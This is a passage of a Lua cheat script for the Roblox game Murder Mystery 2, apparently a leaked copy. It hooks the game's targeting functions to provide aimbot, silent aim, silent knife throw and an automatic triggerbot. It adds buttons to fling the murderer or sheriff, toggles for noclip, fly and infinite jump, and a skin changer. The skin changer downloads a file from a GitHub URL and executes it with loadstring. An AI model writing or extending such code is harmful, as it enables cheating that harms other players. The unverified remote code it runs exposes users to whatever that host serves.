					local hit = workspace:Raycast(humanoidRootPart.Position, flag155.Position - humanoidRootPart.Position, raycastParams)

					if not (hit and hit.Instance and hit.Instance.CanCollide) then
						if magnitude < huge2 then
							huge2 = magnitude
							value113 = flag155
						end
					end
				end
			end
		end

		return value113 or value112
	end

	_G.__SilentThrowTarget = silentThrowTarget

	local function func134()
		if ok and result and result.IsMouseLockEnabled then
			local ok2, result2 = pcall(result.IsMouseLockEnabled)
			if ok2 and result2 then
				return true
			end
		end

		return UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter
	end

	local function func135()
		if func134() then
			return true
		end

		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			return func133() ~= nil
		end
		return false
	end

	RunService:BindToRenderStep("MarbegShiftLockAim", Enum.RenderPriority.Camera.Value + 20, function()
		if not _G.ShiftLockAimbotEnabled or not _G.InRound then
			return
		end

		if not func135() then
			return
		end
		local result12 = aimEnemyHead()
		if not result12 then
			return
		end
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local position = result12.Position

		if _G.__PredictionLeadFor then
			position += _G.__PredictionLeadFor(result12.Parent and result12.Parent:FindFirstChild("HumanoidRootPart"), currentCamera.CFrame.Position)
		end

		currentCamera.CFrame = currentCamera.CFrame:Lerp(CFrame.lookAt(currentCamera.CFrame.Position, position), 0.4)
	end)

	if ok and result and type(result.GetMouseTargetCFrame) == "function" then
		_G.__RealGetMouseTarget = _G.__RealGetMouseTarget or result.GetMouseTargetCFrame
		_G.__SilentAimHooked = true
		local realGetMouseTarget = _G.__RealGetMouseTarget

		local function func136()
			if not (_G.SilentAimEnabled and func133() ~= "Knife") then
				return nil
			end
			local ok2, result2 = pcall(aimEnemyHead)
			local parent = result2 and result2.Parent

			if ok2 and result2 and parent then
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				local gunRaycastAttachment = humanoidRootPart and humanoidRootPart:FindFirstChild("GunRaycastAttachment")
				local worldPosition = gunRaycastAttachment and gunRaycastAttachment.WorldPosition or humanoidRootPart and humanoidRootPart.Position or result2.Position
				local value114 = nil

				if _G.AimWallResolveEnabled and _G.__ResolveVisibleAim then
					value114 = select(1, _G.__ResolveVisibleAim(parent, worldPosition, character, true))
				end

				if not value114 then
					value114 = result2.Position + (_G.__PredictionLeadFor and _G.__PredictionLeadFor(parent:FindFirstChild("HumanoidRootPart"), worldPosition) or Vector3.zero)
				end

				pcall(function()
					if gunRaycastAttachment then
						gunRaycastAttachment.WorldCFrame = CFrame.lookAt(gunRaycastAttachment.WorldPosition, value114)
					end
				end)

				return CFrame.new(value114)
			end

			return nil
		end

		result.GetMouseTargetCFrame = function(...)
			if _G.SilentThrowEnabled and func133() == "Knife" then
				local ok2, result2 = pcall(silentThrowTarget)
				if ok2 and result2 then
					return CFrame.new(result2.Position)
				end
			end

			local result13 = func136()
			if result13 then
				return result13
			end
			return realGetMouseTarget(...)
		end

		if type(result.GetTargetPosition) == "function" then
			_G.__RealGetTargetPosition = _G.__RealGetTargetPosition or result.GetTargetPosition
			local realGetTargetPosition = _G.__RealGetTargetPosition

			result.GetTargetPosition = function(...)
				local result14 = func136()
				if result14 then
					return result14
				end
				return realGetTargetPosition(...)
			end
		end
	end

	_G.TriggerbotEnabled = false
	_G.TriggerbotDelay = 0.05
	_G.TriggerbotFOV = 5
	_G.TriggerbotShowFOV = false

	_G.TriggerbotSetEnabled = function(flag156)
		_G.TriggerbotEnabled = flag156 and true or false
	end

	_G.TriggerbotSetFOV = function(param99)
		_G.TriggerbotFOV = math.clamp(tonumber(param99) or 5, 1, 30)
	end

	_G.TriggerbotReady = false
	_G.CrosshairEnabled = false
	_G.CrosshairDecalId = "1827745864"
	_G.CrosshairSize = 64
	_G.CrosshairSpinEnabled = false
	_G.CrosshairSpinSpeed = 180
	local HttpService = game:GetService("HttpService")

	pcall(function()
		if isfile and readfile and isfile("mm2_crosshair.json") then
			local data = HttpService:JSONDecode(readfile("mm2_crosshair.json"))
			local crosshairDecalId = type(data) == "table"

			if crosshairDecalId then
				crosshairDecalId = tostring(data.DecalId or ""):match("%d+")
			end

			if crosshairDecalId then
				_G.CrosshairDecalId = crosshairDecalId
			end

			if type(data) == "table" and data.Size then
				_G.CrosshairSize = math.clamp(tonumber(data.Size) or 64, 24, 160)
			end
		end
	end)

	if _G.CrosshairDecalId == "2596541801" or _G.CrosshairDecalId == "86241006" or _G.CrosshairDecalId == "11721776729" or _G.CrosshairDecalId == "2400846053" or _G.CrosshairDecalId == "311756276" then
		_G.CrosshairDecalId = "1827745864"
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegCrosshair"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 160
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.TriggerMarkerGui = screenGui
	_G.CrosshairGui = screenGui
	local frame = Instance.new("Frame")
	frame.Name = "CrosshairRoot"
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Size = UDim2.fromOffset(1, 1)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "SelectedCrosshair"
	imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	imageLabel.Position = UDim2.fromScale(0.5, 0.5)
	imageLabel.Size = UDim2.fromOffset(_G.CrosshairSize, _G.CrosshairSize)
	imageLabel.BackgroundTransparency = 1
	imageLabel.BorderSizePixel = 0
	imageLabel.ScaleType = Enum.ScaleType.Fit
	imageLabel.Image = "rbxthumb://type=Asset&id=" .. tostring(_G.CrosshairDecalId) .. "&w=150&h=150"
	imageLabel.Parent = frame

	_G.CrosshairSetEnabled = function(flag157)
		_G.CrosshairEnabled = flag157 and true or false
		screenGui.Enabled = _G.CrosshairEnabled

		if not _G.CrosshairEnabled then
			frame.Rotation = 0
		end

		if _G.ShiftLockCrosshairSetEnabled and _G.__ShiftLockCrosshairRequested ~= nil then
			pcall(function()
				_G.ShiftLockCrosshairSetEnabled(_G.__ShiftLockCrosshairRequested)
			end)
		end
	end

	_G.TriggerbotShowFOVSetEnabled = _G.CrosshairSetEnabled

	_G.CrosshairSetDecal = function(flag158)
		local match = tostring(flag158 or ""):match("%d+")
		if not match then
			return
		end
		_G.CrosshairDecalId = match
		imageLabel.Image = "rbxthumb://type=Asset&id=" .. match .. "&w=150&h=150"

		pcall(function()
			if writefile then
				writefile("mm2_crosshair.json", HttpService:JSONEncode({ DecalId = match, Size = _G.CrosshairSize }))
			end
		end)
	end

	_G.CrosshairSetSize = function(param100)
		_G.CrosshairSize = math.clamp(tonumber(param100) or 64, 24, 160)
		imageLabel.Size = UDim2.fromOffset(_G.CrosshairSize, _G.CrosshairSize)

		pcall(function()
			if writefile then
				writefile("mm2_crosshair.json", HttpService:JSONEncode({ DecalId = _G.CrosshairDecalId, Size = _G.CrosshairSize }))
			end
		end)
	end

	_G.CrosshairSetSpin = function(flag159)
		_G.CrosshairSpinEnabled = flag159 and true or false

		if not _G.CrosshairSpinEnabled then
			frame.Rotation = 0
		end
	end

	_G.CrosshairSetSpinSpeed = function(param101)
		_G.CrosshairSpinSpeed = math.clamp(tonumber(param101) or 180, 0, 720)
	end

	RunService:BindToRenderStep("MarbegCrosshair", Enum.RenderPriority.Last.Value, function(num44)
		if not _G.CrosshairEnabled then
			return
		end
		local mouseLocation = UserInputService:GetMouseLocation()

		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			local currentCamera = workspace.CurrentCamera
			mouseLocation = currentCamera and currentCamera.ViewportSize / 2 or mouseLocation
		end

		frame.Position = UDim2.fromOffset(mouseLocation.X, mouseLocation.Y)

		if _G.CrosshairSpinEnabled then
			frame.Rotation = (frame.Rotation + _G.CrosshairSpinSpeed * num44) % 360
		else
			frame.Rotation = 0
		end
	end)

	_G.HideShiftLockCrosshair = false
	_G.__ShiftLockHiddenInstances = {}
	_G.__ShiftLockIconConns = {}
	_G.__ShiftLockCursorHidden = false
	_G.__ShiftLockSavedCursorIcon = nil
	_G.__ShiftLockSavedCursorEnabled = nil
	_G.__ShiftLockCrosshairRequested = false

	_G.ShiftLockCrosshairSetEnabled = function(flag160)
		local shiftLockHiddenInstances = _G.__ShiftLockHiddenInstances

		for k, shiftLockHiddenInstance in pairs(shiftLockHiddenInstances) do
			if k and k.Parent then
				pcall(function()
					k.Visible = shiftLockHiddenInstance
				end)
			end

			shiftLockHiddenInstances[k] = nil
		end

		for _, shiftLockIconConn in ipairs(_G.__ShiftLockIconConns) do
			pcall(function()
				shiftLockIconConn:Disconnect()
			end)
		end

		_G.__ShiftLockIconConns = {}

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegHideShiftLockCursor")
		end)

		if _G.__ShiftLockCursorHidden then
			local value115 = localPlayer
			local mouse

			if localPlayer then
				mouse = localPlayer:GetMouse()
			else
				mouse = value115
			end

			if mouse then
				pcall(function()
					mouse.Icon = _G.__ShiftLockSavedCursorIcon or ""
				end)
			end

			if _G.__ShiftLockSavedCursorEnabled ~= nil then
				pcall(function()
					UserInputService.MouseIconEnabled = _G.__ShiftLockSavedCursorEnabled
				end)
			end

			_G.__ShiftLockCursorHidden = false
		end

		_G.HideShiftLockCrosshair = flag160 and true or false
		_G.__ShiftLockCrosshairRequested = _G.HideShiftLockCrosshair
		if not _G.HideShiftLockCrosshair or not _G.CrosshairEnabled then
			return
		end
		local value116 = localPlayer
		local mouse

		if localPlayer then
			mouse = localPlayer:GetMouse()
		else
			mouse = value116
		end

		_G.__ShiftLockSavedCursorIcon = mouse and mouse.Icon or ""
		_G.__ShiftLockSavedCursorEnabled = UserInputService.MouseIconEnabled
		_G.__ShiftLockCursorHidden = true

		local function func137()
			if mouse then
				pcall(function()
					mouse.Icon = ""
				end)
			end

			pcall(function()
				UserInputService.MouseIconEnabled = false
			end)
		end

		func137()
		RunService:BindToRenderStep("MarbegHideShiftLockCursor", Enum.RenderPriority.Last.Value + 10, func137)

		local function func138(instance21)
			if not (instance21:IsA("ImageLabel") or instance21:IsA("ImageButton")) then
				return
			end
			local lowered6 = string.lower(instance21.Name or "")
			local str1 = ""

			pcall(function()
				str1 = string.lower(instance21.Image or "")
			end)

			if string.find(lowered6, "shiftlock", 1, true) or string.find(lowered6, "mouselock", 1, true) or string.find(lowered6, "mouse_lock", 1, true) or string.find(lowered6, "cursorimage", 1, true) or string.find(str1, "mouselock", 1, true) or string.find(str1, "shiftlock", 1, true) or string.find(str1, "mouselockedcursor", 1, true) then
				shiftLockHiddenInstances[instance21] = instance21.Visible
				instance21.Visible = false
			end
		end

		local tbl67 = {}

		local ok2, result2 = pcall(function()
			return game:GetService("CoreGui")
		end)

		if ok2 and result2 then
			table.insert(tbl67, result2)
		end

		local playerGui = localPlayer and localPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl67, playerGui)
		end

		local ok3, result3 = pcall(func2)

		if ok3 and result3 then
			table.insert(tbl67, result3)
		end

		for _, item54 in ipairs(tbl67) do
			for _, descendant in ipairs(item54:GetDescendants()) do
				pcall(func138, descendant)
			end

			table.insert(_G.__ShiftLockIconConns, item54.DescendantAdded:Connect(function(descendant)
				task.defer(function()
					pcall(func138, descendant)
				end)
			end))
		end
	end

	_G.TriggerbotSetDelay = function(param102)
		_G.TriggerbotDelay = math.clamp(tonumber(param102) or 0.05, 0, 0.6)
	end

	local function func139(param103, instance22, param104)
		for _, item55 in ipairs({ "Head", "HumanoidRootPart" }) do
			local flag161 = instance22:FindFirstChild(item55)
			if flag161 and _G.__InnocentInLine(param103, instance22, flag161.Position, param104) then
				return true
			end
		end

		return false
	end

	local flag162 = false
	local triggerLoopId = {}
	_G.__TriggerLoopId = triggerLoopId

	task.spawn(function()
		while _G.__TriggerLoopId == triggerLoopId do
			task.wait(0.05)

			if _G.TriggerbotEnabled and _G.InRound and not flag162 then
				if not pcall(function()
					local result15 = aimEnemyHead()
					local character = localPlayer.Character
					if not result15 or not character then
						_G.TriggerbotReady = false
						return
					end
					local raycastParams = RaycastParams.new()
					raycastParams.FilterType = Enum.RaycastFilterType.Exclude
					raycastParams.FilterDescendantsInstances = { character, result15.Parent }
					raycastParams.IgnoreWater = true
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					humanoidRootPart = humanoidRootPart and humanoidRootPart.Position or result15.Position
					local hit = workspace:Raycast(humanoidRootPart, result15.Position - humanoidRootPart, raycastParams)
					if hit and hit.Instance and hit.Instance.CanCollide then
						_G.TriggerbotReady = false
						return
					end

					if func139(humanoidRootPart, result15.Parent, character) then
						_G.TriggerbotReady = false
						return
					end
					_G.TriggerbotReady = true
					flag162 = true

					if _G.TriggerbotDelay > 0 then
						task.wait(_G.TriggerbotDelay)
					end

					local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")
					local parent = result15.Parent
					local value117

					if parent then
						value117 = func139(humanoidRootPart2 and humanoidRootPart2.Position or humanoidRootPart, result15.Parent, character)
					else
						value117 = parent
					end

					if value117 then
						_G.TriggerbotReady = false
						flag162 = false
						return
					end

					_G.ShootMurderer()
					task.wait(0.25)
					flag162 = false
				end) then
					flag162 = false
				end
			end
		end
	end)
end

_G.ShiftLockAimbotSetEnabled = function(flag163)
	_G.ShiftLockAimbotEnabled = flag163 and true or false
end

_G.SilentAimSetEnabled = function(flag164)
	_G.SilentAimEnabled = flag164 and true or false
end

_G.SilentThrowSetEnabled = function(flag165)
	_G.SilentThrowEnabled = flag165 and true or false
end

do
	local function createTextButton(name, str2, param105, param106, param107, param108, callback2)
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.DisplayOrder = 98
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Enabled = false
		screenGui.Parent = func2()
		_G[str2 .. "Gui"] = screenGui
		local textButton = Instance.new("TextButton")
		textButton.Name = name
		textButton.AnchorPoint = Vector2.new(0, 0.5)
		textButton.Active = true
		textButton.AutoLocalize = false
		textButton.Parent = screenGui
		local value118 = _G.__StyleSquareButton(textButton, param105, param106, param107)

		_G[str2 .. "SetEnabled"] = function(enabled2)
			screenGui.Enabled = enabled2 and true or false
		end

		textButton.MouseEnter:Connect(function()
			local tbl68 = { Color = param108, Transparency = 0 }
			TweenService:Create(value118, TweenInfo.new(0.13), tbl68):Play()
		end)

		textButton.MouseLeave:Connect(function()
			local tbl69 = { Color = param107, Transparency = 0.1 }
			TweenService:Create(value118, TweenInfo.new(0.13), tbl69):Play()
		end)

		local flag166 = false
		local flag167 = false
		local position = nil
		local value119 = nil
		local value120 = nil

		textButton.InputBegan:Connect(function(input)
			if _G.LockButtonsEnabled then
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag166 = true
				flag167 = false
				local position2 = textButton.Position
				position = input.Position
				value119 = position2
				value120 = input

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag166 = false
					end
				end)
			end
		end)

		textButton.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				value120 = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if flag166 and input == value120 and position then
				local n2 = input.Position - position

				if n2.Magnitude > 4 then
					flag167 = true
				end

				textButton.Position = UDim2.new(value119.X.Scale, value119.X.Offset + n2.X, value119.Y.Scale, value119.Y.Offset + n2.Y)
			end
		end)

		textButton.Activated:Connect(function()
			if flag167 then
				flag167 = false
				return
			end
			callback2()
		end)

		return textButton
	end

	local MarbegFlingMurderer = createTextButton("MarbegFlingMurderer", "FlingMurdererButton", "skull", "FLING\nMURDERER", Color3.fromRGB(255, 60, 70), Color3.fromRGB(255, 130, 140), function()
		local flag168, value121 = _G.RoleFlingTarget({ "Murderer" })

		if _G.WindNotify then
			_G.WindNotify("Fling Murderer", tostring(value121), flag168 and "skull" or "circle-x")
		end
	end)

	MarbegFlingMurderer.Position = UDim2.new(0, 500, 0.38, 168)
	_G.__TrackButtonPosition("FlingMurderer", MarbegFlingMurderer)

	local MarbegBombBoost = createTextButton("MarbegBombBoost", "BombBoostButton", "bomb", "BOMB\nBOOST", Color3.fromRGB(240, 140, 40), Color3.fromRGB(255, 195, 120), function()
		local flag169, value122 = _G.BombBoost()

		if _G.WindNotify then
			_G.WindNotify("Bomb Boost", tostring(value122), flag169 and "bomb" or "circle-x")
		end
	end)

	MarbegBombBoost.Position = UDim2.new(0, 500, 0.38, 252)
	_G.__TrackButtonPosition("BombBoost", MarbegBombBoost)

	local MarbegFlingSheriff = createTextButton("MarbegFlingSheriff", "FlingSheriffButton", "shield", "FLING\nSHERIFF", Color3.fromRGB(55, 145, 255), Color3.fromRGB(140, 200, 255), function()
		local flag170, value123 = _G.RoleFlingTarget({ "Hero", "Sheriff" })

		if _G.WindNotify then
			_G.WindNotify("Fling Hero / Sheriff", tostring(value123), flag170 and "shield" or "circle-x")
		end
	end)

	MarbegFlingSheriff.Position = UDim2.new(0, 584, 0.38, 168)
	_G.__TrackButtonPosition("FlingSheriff", MarbegFlingSheriff)
	local tbl70 = {}

	local tbl71 = {
		gui = "MarbegNoclipButton",
		global = "NoclipButton",
		flag = "Noclip",
		state = "NoclipEnabled",
		icon = "ghost",
		caption = "NOCLIP",
		accent = Color3.fromRGB(150, 110, 255),
		y = 84,
	}

	local tbl72 = {
		gui = "MarbegFlyButton",
		global = "FlyButton",
		flag = "Fly",
		state = "PlayerFlyEnabled",
		icon = "plane",
		caption = "FLY",
		accent = Color3.fromRGB(60, 200, 255),
		y = 168,
	}

	local tbl73 = {
		gui = "MarbegInfJumpButton",
		global = "InfJumpButton",
		flag = "InfiniteJump",
		state = "InfiniteJumpEnabled",
		icon = "chevrons-up",
		caption = "INF\nJUMP",
		accent = Color3.fromRGB(80, 230, 140),
		y = 252,
	}

	local tbl74 = {
		gui = "MarbegWallJumpButton",
		global = "WallJumpButton",
		flag = "WallJump",
		state = "WallJumpEnabled",
		icon = "move-up",
		caption = "WALL\nJUMP",
		accent = Color3.fromRGB(255, 200, 70),
		y = 336,
	}

	tbl70[1] = tbl71
	tbl70[2] = tbl72
	tbl70[3] = tbl73
	tbl70[4] = tbl74

	for _, item56 in ipairs(tbl70) do
		local textButton2 = createTextButton(item56.gui, item56.global, item56.icon, item56.caption, item56.accent, item56.accent:Lerp(Color3.new(1, 1, 1), 0.4), function()
			local elements = _G.MM2ScriptConfig and _G.MM2ScriptConfig.Elements and _G.MM2ScriptConfig.Elements[item56.flag]
			local flag171 = not _G[item56.state]

			if elements then
				pcall(function()
					elements:Set(flag171)
				end)
			end
		end)

		textButton2.Position = UDim2.new(0, 668, 0.38, item56.y)
		_G.__TrackButtonPosition(item56.global, textButton2)
		item56.stroke = textButton2:FindFirstChildWhichIsA("UIStroke", true)
		item56.baseThickness = item56.stroke and item56.stroke.Thickness or 2
	end

	local playerButtonLightLoop = {}
	_G.__PlayerButtonLightLoop = playerButtonLightLoop

	task.spawn(function()
		while _G.__PlayerButtonLightLoop == playerButtonLightLoop do
			for _, item57 in ipairs(tbl70) do
				if item57.stroke then
					item57.stroke.Thickness = _G[item57.state] == true and item57.baseThickness + 1.5 or item57.baseThickness
				end
			end

			task.wait(0.25)
		end
	end)
end

do
	local tbl75 = {
		Ancient = Color3.fromRGB(100, 10, 255),
		Godly = Color3.fromRGB(255, 0, 255),
		Unique = Color3.fromRGB(255, 140, 0),
		Legendary = Color3.fromRGB(255, 0, 0),
		Rare = Color3.fromRGB(0, 255, 0),
		Uncommon = Color3.fromRGB(0, 255, 255),
		Classic = Color3.fromRGB(255, 255, 0),
		Common = Color3.fromRGB(255, 255, 255),
	}

	local function loadData()
		if type(_G.MM2SkinData) == "table" then
			return _G.MM2SkinData
		end
		local meshid = func1("https://raw.githubusercontent.com/meeqscripts/mm2/refs/heads/main/meshid")
		if not meshid then
			return nil, "Skin list could not be downloaded."
		end
		local chunk, value124 = loadstring(meshid, "@mm2_skins_data.lua")
		if not chunk then
			return nil, "Skin list is invalid: " .. tostring(value124)
		end
		local ok, mM2SkinData = pcall(chunk)
		if not ok or type(mM2SkinData) ~= "table" then
			return nil, "Skin list failed to load."
		end
		_G.MM2SkinData = mM2SkinData
		return mM2SkinData
	end

	local function func140(part19, num45)
		local n2 = part19 - part19.Position
		return CFrame.new(part19.Position * num45) * n2
	end

	local function func141(param109)
		local props = param109.Props or {}
		if param109.Class == "MeshPart" then
			return { MeshId = props.MeshId, TextureId = props.TextureID, Size = props.Size, FromMeshPart = true }
		end
		local func142 = ipairs
		local children = param109.Children or {}

		for _, child in func142(children) do
			if child.Class == "SpecialMesh" or child.Class == "FileMesh" then
				local props2 = child.Props or {}

				return {
					MeshId = props2.MeshId,
					TextureId = props2.TextureId,
					Scale = props2.Scale,
					Offset = props2.Offset,
					VertexColor = props2.VertexColor,
					Size = props.Size,
					MeshNode = child,
				}
			end
		end

		return { Size = props.Size }
	end

	local tbl76 = {}

	local function func143(flag172)
		if not flag172 or flag172 == "" then
			return nil
		end

		if tbl76[flag172] then
			return tbl76[flag172]
		end

		local ok, result = pcall(function()
			return game:GetService("InsertService"):CreateMeshPartAsync(flag172, Enum.CollisionFidelity.Box, Enum.RenderFidelity.Performance)
		end)

		if ok and typeof(result) == "Instance" then
			local size = result.Size

			if size.X > 0 and size.Y > 0 and size.Z > 0 then
				tbl76[flag172] = size
			end

			result:Destroy()
		end

		return tbl76[flag172]
	end

	local function func144(flag173, flag174)
		if flag173 == "MeshPart" and flag174 and flag174 ~= "" then
			local ok, result = pcall(function()
				return game:GetService("InsertService"):CreateMeshPartAsync(flag174, Enum.CollisionFidelity.Box, Enum.RenderFidelity.Performance)
			end)

			if ok and typeof(result) == "Instance" then
				return result
			end
		end

		return Instance.new(flag173)
	end

	local value125 = nil

	value125 = function(param110, parent, num46, part1, flag175)
		local n2 = flag175 or 1
		num46 = num46 or CFrame.new()
		local class = func144(param110.Class, param110.Props and param110.Props.MeshId)
		class.Name = param110.Name or param110.Class
		class:SetAttribute("MM2SkinExtra", true)
		local func145 = pairs
		local props = param110.Props or {}

		for k, prop in func145(props) do
			if k ~= "RelCF" and k ~= "Size" then
				pcall(function()
					class[k] = prop
				end)
			end
		end

		if class:IsA("BasePart") then
			local n3 = num46 * func140(param110.Props and param110.Props.RelCF or CFrame.new(), n2)

			pcall(function()
				class.Anchored = false
				class.Massless = true
				class.CanQuery = false
			end)

			class.CFrame = (part1 and part1.CFrame or CFrame.new()) * n3
			class.Parent = parent
			local size = param110.Props and param110.Props.Size
			local size2 = size and size * n2

			if size2 then
				pcall(function()
					class.Size = size2
				end)

				task.spawn(function()
					task.wait(0.1)

					if class.Parent then
						pcall(function()
							class.Size = size2
						end)
					end
				end)
			end

			part1 = part1 or class
			local func146 = ipairs
			local children = param110.Children or {}

			for _, child in func146(children) do
				value125(child, class, part1 == class and CFrame.new() or n3, part1, n2)
			end
		elseif class:IsA("Attachment") then
			class.CFrame = func140(param110.Props and param110.Props.RelCF or CFrame.new(), n2)
			class.Parent = parent
		elseif class.ClassName == "WeldConstraint" then
			class.Part0 = parent
			class.Part1 = part1
			class.Parent = parent
		elseif class:IsA("SurfaceAppearance") then
			if parent and parent:IsA("MeshPart") then
				pcall(function()
					class.Parent = parent
				end)
			else
				class:Destroy()
			end
		elseif pcall(function()
					class.Parent = parent
				end) then
			local func147 = ipairs
			local children = param110.Children or {}

			for _, child in func147(children) do
				value125(child, parent, num46, part1, n2)
			end
		else
			class:Destroy()
		end
		-- https://discord.gg/x7YbZeezpm | 𝖲𝖫 | 𝖲𝗈𝗎𝗋𝖼𝖾 𝖫𝖾𝖺𝗄

		return class
	end

	local tbl77 = {
		Attachment = true,
		RigidConstraint = true,
		WeldConstraint = true,
		Weld = true,
		Motor6D = true,
		Script = true,
		LocalScript = true,
		ModuleScript = true,
	}

	local function func148(instance23, param111)
		local relCF = nil
		local func149 = ipairs
		local children = param111.Children or {}

		for _, child in func149(children) do
			if child.Class == "Attachment" and child.Props and child.Props.RelCF then
				relCF = child.Props.RelCF
				break
			end
		end

		if not relCF then
			return
		end

		for _, child in ipairs(instance23:GetChildren()) do
			if child:IsA("RigidConstraint") then
				local attachment1 = child.Attachment1

				if attachment1 and attachment1.Parent == instance23 then
					pcall(function()
						attachment1.CFrame = relCF
					end)
				end
			end
		end
	end

	_G.__MM2ClearChromaArtifacts = function(list29)
		if not list29 then
			return
		end
		_G.MM2ChromaGroups[list29] = nil

		for _, descendant in ipairs(list29:GetDescendants()) do
			_G.MM2ChromaGroups[descendant] = nil
		end

		local list30 = {}

		for _, descendant in ipairs(list29:GetDescendants()) do
			local lowered7 = string.lower(descendant.Name)

			if lowered7 == "chroma" or lowered7 == "chromascript" or lowered7 == "chromapart" or lowered7 == "chromafire" then
				if not descendant:GetAttribute("MM2SkinExtra") then
					list30[#list30 + 1] = descendant
				end
			end
		end

		for _, item58 in ipairs(list30) do
			pcall(function()
				item58:Destroy()
			end)
		end
	end

	local function func150(list31)
		if not list31 then
			return
		end
		local CollectionService = game:GetService("CollectionService")
		local list32 = { list31 }

		for _, descendant in ipairs(list31:GetDescendants()) do
			list32[#list32 + 1] = descendant
		end

		for _, item59 in ipairs(list32) do
			for _, item60 in ipairs({ "ChromaPart", "ChromaDecal", "ChromaFire" }) do
				pcall(function()
					CollectionService:RemoveTag(item59, item60)
				end)
			end
		end
	end

	_G.MM2ChromaGroups = {}

	local function func151(obj30)
		local flag176, flag177, flag178 = obj30:ToHSV()
		return flag177 > 0.83 and flag178 > 0.6 and (flag176 < 0.05 or flag176 > 0.95)
	end

	local function func152(instance24)
		local tbl78 = { Parts = {}, Decals = {}, FX = {} }
		local decals = {}

		if instance24:IsA("BasePart") and func151(instance24.Color) then
			tbl78.Parts[#tbl78.Parts + 1] = instance24
		end

		for _, descendant in ipairs(instance24:GetDescendants()) do
			if descendant ~= instance24 then
				if descendant:IsA("BasePart") then
					if descendant.Material == Enum.Material.Neon or func151(descendant.Color) then
						tbl78.Parts[#tbl78.Parts + 1] = descendant
					end
				elseif descendant:IsA("Decal") or descendant:IsA("Texture") then
					decals[#decals + 1] = descendant
				elseif descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
					tbl78.FX[#tbl78.FX + 1] = descendant
				end
			end
		end

		if #tbl78.Parts > 0 then
			for _, decal in ipairs(decals) do
				if decal.Transparency > 0.3 then
					tbl78.Decals[#tbl78.Decals + 1] = decal
				end
			end
		else
			tbl78.Decals = decals
		end

		if #tbl78.Parts == 0 and #tbl78.Decals == 0 and #tbl78.FX == 0 then
			return
		end
		_G.MM2ChromaGroups[instance24] = tbl78
	end

	local tbl79 = {
		Gun = { Rot = CFrame.Angles(-1.5707963267948966, 0, 0), Pos = Vector3.new(0, -0.1, 0.2), Len = 0 },
		Knife = { Rot = CFrame.Angles(0, 0, 0), Pos = Vector3.new(0, 0.1, 0.1), Len = 0 },
	}

	local tbl80 = {
		Blizzard = { Pos = Vector3.new(0, 0.55, 0) },
		Gingerscope = {
			Pos = Vector3.new(0, -0.1, 0.2),
			Rot = CFrame.Angles(-0.1308996938995747, 0.087266462599716474, 0),
		},
	}

	_G.MM2HeldFitOverride = _G.MM2HeldFitOverride or {}

	local function func153(param112)
		if type(param112) ~= "table" then
			return tbl79.Gun.Rot
		end
		local size = func141(param112)
		size = size and size.Size
		if typeof(size) ~= "Vector3" then
			return tbl79.Gun.Rot
		end
		local n2 = math.abs(size.X)
		local n3 = math.abs(size.Y)
		local n4 = math.abs(size.Z)
		if n3 >= n2 and n3 >= n4 then
			return tbl79.Gun.Rot
		end
		return CFrame.Angles(-0.1308996938995747, 0, 0)
	end

	local function func154(flag179, flag180)
		local flag181 = flag179 and flag179.ItemType == "Knife" and "Knife" or "Gun"
		local entry18 = tbl79[flag181]
		local rot = flag181 == "Gun" and flag180 and func153(flag180) or entry18.Rot
		local pos = entry18.Pos
		local len = entry18.Len

		local function func155(param113)
			if type(param113) ~= "table" then
				return
			end
			rot = param113.Rot or rot
			pos = param113.Pos or pos
			len = param113.Len or len
		end

		local itemName = flag179 and flag179.ItemName

		if itemName then
			func155(tbl80[itemName])
			func155(_G.MM2HeldFitOverride[itemName])
		end

		return { Rot = rot, Pos = pos, Len = len }
	end

	local function func156(parent, param114, flag182, flag183, flag184)
		if not parent or not parent:IsA("BasePart") or type(param114) ~= "table" then
			return false
		end
		_G.__MM2ClearChromaArtifacts(parent)

		for _, child in ipairs(parent:GetChildren()) do
			if child:GetAttribute("MM2SkinExtra") or child:GetAttribute("GingerscopeExtra") or child:IsA("SurfaceAppearance") then
				child:Destroy()
			end
		end

		func150(parent)

		if parent:GetAttribute("MM2OriginalSize") == nil then
			parent:SetAttribute("MM2OriginalSize", parent.Size)
		end

		local props = param114.Props or {}
		local value126 = func141(param114)
		local vector = typeof(flag183) == "Vector3" and flag183 or Vector3.one

		for k, prop in pairs(props) do
			if k ~= "RelCF" and k ~= "Size" and k ~= "MeshId" and k ~= "TextureID" then
				pcall(function()
					parent[k] = prop
				end)
			end
		end

		local part = nil

		if parent:IsA("MeshPart") and value126.MeshId then
			pcall(function()
				parent.Transparency = 1
			end)

			if props.Size then
				pcall(function()
					parent.Size = props.Size
				end)
			end

			if value126.FromMeshPart then
				local ok, result = pcall(function()
					return game:GetService("InsertService"):CreateMeshPartAsync(value126.MeshId, Enum.CollisionFidelity.Box, Enum.RenderFidelity.Precise)
				end)

				if ok and typeof(result) == "Instance" then
